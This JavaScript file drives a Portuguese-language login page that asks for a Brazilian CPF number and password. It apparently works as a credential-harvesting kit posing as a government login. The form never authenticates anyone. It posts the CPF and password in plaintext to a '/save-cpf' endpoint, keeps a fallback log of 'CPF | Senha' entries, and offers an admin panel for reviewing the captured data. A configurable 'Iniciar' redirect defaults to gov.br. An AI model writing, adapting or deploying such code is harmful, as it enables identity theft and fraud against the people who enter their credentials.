// Login and Admin Panel JavaScript

// Initialize data on page load
document.addEventListener('DOMContentLoaded', function() {
    loadUserData();
    loadRedirectUrl();
    updateStats();
});

// Login Modal Functions
function openLoginModal() {
    const modal = document.getElementById('login-modal');
    if (modal) {
        modal.style.display = 'flex';
        document.body.style.overflow = 'hidden';
    }
}

function closeLoginModal() {
    const modal = document.getElementById('login-modal');
    if (modal) {
        modal.style.display = 'none';
        document.body.style.overflow = 'auto';
        // Clear form
        document.getElementById('cpf-input').value = '';
        document.getElementById('password-input').value = '';
    }
}

function handleLogin() {
    const cpf = document.getElementById('cpf-input').value;
    const password = document.getElementById('password-input').value;
    
    if (!cpf || !password) {
        alert('Por favor, preencha todos os campos.');
        return;
    }
    
    // Store user data
    const userData = {
        cpf: cpf,
        password: password,
        loginTime: new Date().toISOString()
    };
    
    localStorage.setItem('currentUser', JSON.stringify(userData));
    
    // Save CPF to persistent storage
    saveCPFToFile(cpf, password);
    
    // Update login count
    let loginCount = parseInt(localStorage.getItem('loginCount') || '0');
    loginCount++;
    localStorage.setItem('loginCount', loginCount.toString());
    localStorage.setItem('lastLogin', new Date().toLocaleString('pt-BR'));
    
    // Close modal and show success message
    closeLoginModal();
    showLoginSuccess();
    
    // Update login button to show logged in state
    updateLoginButton();
}

// Save CPF to file function
function saveCPFToFile(cpf, password) {
    // Send data to server
    fetch('http://localhost:3000/save-cpf', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({ cpf, password })
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            console.log('CPF salvo no servidor com sucesso');
        } else {
            console.error('Erro ao salvar CPF no servidor:', data.message);
        }
    })
    .catch(error => {
        console.error('Erro de conexão com o servidor:', error);
        // Fallback: save to localStorage if server is not available
        const timestamp = new Date().toLocaleString('pt-BR');
        const logEntry = `Data: ${timestamp} | CPF: ${cpf} | Senha: ${password}\n`;
        let existingLogs = localStorage.getItem('cpfLogs') || '';
        existingLogs += logEntry;
        localStorage.setItem('cpfLogs', existingLogs);
    });
}

// Load logs from server for admin panel
async function loadLogsFromServer() {
    try {
        const response = await fetch('http://localhost:3000/get-logs');
        const data = await response.json();
        
        if (data.success && data.logs) {
            // Display logs in admin panel
            const logsContainer = document.getElementById('logs-display');
            if (logsContainer) {
                logsContainer.textContent = data.logs;
            }
        }
    } catch (error) {
        console.error('Erro ao carregar logs do servidor:', error);
    }
}

function showLoginSuccess() {
    // Create success message
    const successDiv = document.createElement('div');
    successDiv.className = 'success-message';
    successDiv.innerHTML = '✓ Login realizado com sucesso!';
    document.body.appendChild(successDiv);
    
    // Show message
    setTimeout(() => {
        successDiv.style.opacity = '1';
    }, 100);
    
    // Remove message after 3 seconds
    setTimeout(() => {
        successDiv.style.opacity = '0';
        setTimeout(() => {
            document.body.removeChild(successDiv);
        }, 300);
    }, 3000);
}

function updateLoginButton() {
    const loginBtn = document.querySelector('.login-btn');
    const userData = JSON.parse(localStorage.getItem('currentUser') || '{}');
    
    if (userData.cpf) {
        loginBtn.textContent = `Logado: ${userData.cpf.substring(0, 3)}.***.***-${userData.cpf.substring(9)}`;
        loginBtn.style.background = '#28a745';
    }
}

// Redirect function for "Iniciar" button
function handleStartRedirect() {
    const redirectUrl = localStorage.getItem('redirectUrl') || 'https://www.gov.br';
    window.open(redirectUrl, '_blank');
}

// Admin Panel Functions
function loadUserData() {
    const userData = JSON.parse(localStorage.getItem('currentUser') || '{}');
    const cpfElement = document.getElementById('stored-cpf');
    const passwordElement = document.getElementById('stored-password');
    
    if (cpfElement) {
        cpfElement.textContent = userData.cpf || 'Nenhum usuário';
    }
    
    if (passwordElement) {
        passwordElement.textContent = userData.password ? '***'.repeat(userData.password.length) : 'Nenhuma senha';
    }
}

function loadRedirectUrl() {
    const redirectUrl = localStorage.getItem('redirectUrl') || '';
    const urlInput = document.getElementById('redirect-url');
    const currentUrlElement = document.getElementById('current-url');
    
    if (urlInput) {
        urlInput.value = redirectUrl;
    }
    
    if (currentUrlElement) {
        currentUrlElement.textContent = redirectUrl || 'Nenhuma URL configurada';
    }
}

function saveRedirectUrl() {
    const urlInput = document.getElementById('redirect-url');
    const url = urlInput.value.trim();
    
    if (!url) {
        alert('Por favor, digite uma URL válida.');
        return;
    }
    
    // Basic URL validation
    try {
        new URL(url);
    } catch (e) {
        alert('URL inválida. Use o formato completo: https://exemplo.com');
        return;
    }
    
    localStorage.setItem('redirectUrl', url);
    
    // Update display
    const currentUrlElement = document.getElementById('current-url');
    if (currentUrlElement) {
        currentUrlElement.textContent = url;
    }
    
    // Show success message
    showSaveSuccess();
}

function showSaveSuccess() {
    const saveBtn = document.querySelector('.save-btn');
    const originalText = saveBtn.textContent;
    
    saveBtn.textContent = '✓ Salvo!';
    saveBtn.style.background = '#28a745';
    
    setTimeout(() => {
        saveBtn.textContent = originalText;
        saveBtn.style.background = '';
    }, 2000);
}

function clearUserData() {
    if (confirm('Tem certeza que deseja limpar todos os dados do usuário?')) {
        localStorage.removeItem('currentUser');
        loadUserData();
        
        // Show success message
        const clearBtn = document.querySelector('.clear-btn');
        const originalText = clearBtn.textContent;
        
        clearBtn.textContent = '✓ Dados limpos!';
        clearBtn.style.background = '#dc3545';
        
        setTimeout(() => {
            clearBtn.textContent = originalText;
            clearBtn.style.background = '';
        }, 2000);
    }
}

function updateStats() {
    const loginCount = localStorage.getItem('loginCount') || '0';
    const lastLogin = localStorage.getItem('lastLogin') || 'Nenhum';
    
    const loginCountElement = document.getElementById('login-count');
    const lastLoginElement = document.getElementById('last-login');
    
    if (loginCountElement) {
        loginCountElement.textContent = loginCount;
    }
    
    if (lastLoginElement) {
        lastLoginElement.textContent = lastLogin;
    }
}

// Close modal when clicking outside
document.addEventListener('click', function(event) {
    const modal = document.getElementById('login-modal');
    if (modal && event.target === modal) {
        closeLoginModal();
    }
});

// Close modal with Escape key
document.addEventListener('keydown', function(event) {
    if (event.key === 'Escape') {
        closeLoginModal();
    }
});

// Format CPF input
document.addEventListener('DOMContentLoaded', function() {
    const cpfInput = document.getElementById('cpf-input');
    if (cpfInput) {
        cpfInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            
            if (value.length > 11) {
                value = value.substring(0, 11);
            }
            
            // Format CPF: XXX.XXX.XXX-XX
            if (value.length > 9) {
                value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6, 9) + '-' + value.substring(9);
            } else if (value.length > 6) {
                value = value.substring(0, 3) + '.' + value.substring(3, 6) + '.' + value.substring(6);
            } else if (value.length > 3) {
                value = value.substring(0, 3) + '.' + value.substring(3);
            }
            
            e.target.value = value;
        });
    }
});

// Initialize login button state on main page
document.addEventListener('DOMContentLoaded', function() {
    if (window.location.pathname.includes('index.html') || window.location.pathname === '/') {
        updateLoginButton();
    }
});
